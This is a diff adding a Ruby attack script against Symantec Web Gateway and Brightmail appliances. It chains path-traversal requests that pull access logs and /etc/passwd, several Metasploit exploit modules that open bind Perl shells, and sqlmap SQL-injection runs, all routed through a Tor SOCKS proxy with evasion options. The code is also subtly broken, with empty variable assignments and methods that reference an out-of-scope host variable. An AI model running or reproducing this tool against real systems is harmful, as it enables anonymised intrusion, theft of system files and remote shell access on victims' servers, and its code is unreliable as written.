@@ -1,0 +1,67 @@
+#!/usr/bin/ruby
+require 'httpclient'
+require 'thread'
+host = ARGV[0]
+controlserv = 
+controlport = 
+def lfi
+	gwt = host + "/spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log"
+	gwtr = HTTPClient.get(gwt) 
+	puts gwt
+	puts gwtr.code 
+	if gwtr.code == 200 
+		`wget #{gwt}`
+	end 
+	gbl = host + "/spywall/languageTest.php?&language=../../../../../../../../usr/local/apache2/logs/access_log"
+	gblr = HTTPClient.get(gbl)
+	puts gbl 
+	puts gblr.code
+	if gblr.code == 200 
+		`wget #{gbl}`
+	end
+	ds = host + "/brightmail/export?type=logs&logFile=../../../etc/passwd&logType=1&browserType=1"	
+	cx = host + "/brightmail/admin/restore/download.do?no-cache=false&displayTab=restore&restoreSource=APPLIANCE&localBackupFileSelection=../../etc/passwd"
+	dsr = HTTPClient.get(ds) 
+	puts ds	
+	puts dsr.code 
+	if dsr.code == 200 
+		`wget #{ds}`
+	end 
+	cxr = HTTPClient.get(cx) 
+	if cxr.code == 200 
+		`wget #{cx}`
+
+	end 
+	
+	cxf = host + "/brightmail/export?type=logs&logFile=../../../etc/passwd&logType=1&browserType=1"
+	cxfr = HTTPClient.get(cxf) 
+	puts cxfr.code 
+	if cxfr.code == 200 
+		`wget #{cxf}`
+	end
+
+end
+
+def rce 
+	ipchng = `msfconsole -x "use exploit/linux/http/symantec_web_gateway_exec; set RHOST #{host}; set Proxies socks4://127.0.0.1:9050; set PAYLOAD cmd/unix/bind_perl; set HTTP::header_folding true; set HTTP::method_random_case true; set HTTP::pad_fake_headers true; set HTTP::pad_fake_headers_count 8; set HTTP::pad_get_params true; set HTTP::pad_post_params true; set LPORT 14300; exploit "`	
+	puts ipchng 
+	wglfi = `msfconsole -x "use exploit/linux/http/symantec_web_gateway_lfi; set RHOST #{host}; set Proxies  socks4://127.0.0.1:9050;  set PAYLOAD cmd/unix/bind_perl; set LPORT 14300; exploit"`
+	puts wglfi 
+	pbcont = `msfconsole -x "use exploit/linux/http/symantec_web_gateway_pbcontrol;  set RHOST #{host}; set Proxies  socks4://127.0.0.1:9050;  set PAYLOAD cmd/unix/bind_perl; set LPORT 14300; exploit"`
+	puts pbcont
+	rest = `msfconsole -x "use  exploit/linux/http/symantec_web_gateway_restore; set RHOST #{host}; set Proxies  socks4://127.0.0.1:9050;  set PAYLOAD cmd/unix/bind_perl; set LPORT 14300; exploit"`
+	puts rest 
+	`msfconsole -x "exit"`	
+end 
+
+def sqli
+	puts  `sqlmap -u #{host}/spywall/ldap_latest.php?ip=1 --tamper likerandomcasecomment --proxy socks4://127.0.0.1:9050 --random-agent`
+	puts `sqlmap -u "#{host}/spywall/blocked.php?d=3&file=3&id=1*" --tamper likerandomcasecomment --proxy socks4://127.0.0.1:9050 --random-agent`
+	
+	puts `sqlmap -u #{host}/spywall/includes/deptUploads_data.php?groupid=1 --tamper likerandomcasecomment --proxy socks4://127.0.0.1:9050 --random-agent` 
+
+end
+
+lfi 
+rce 
+sqli 
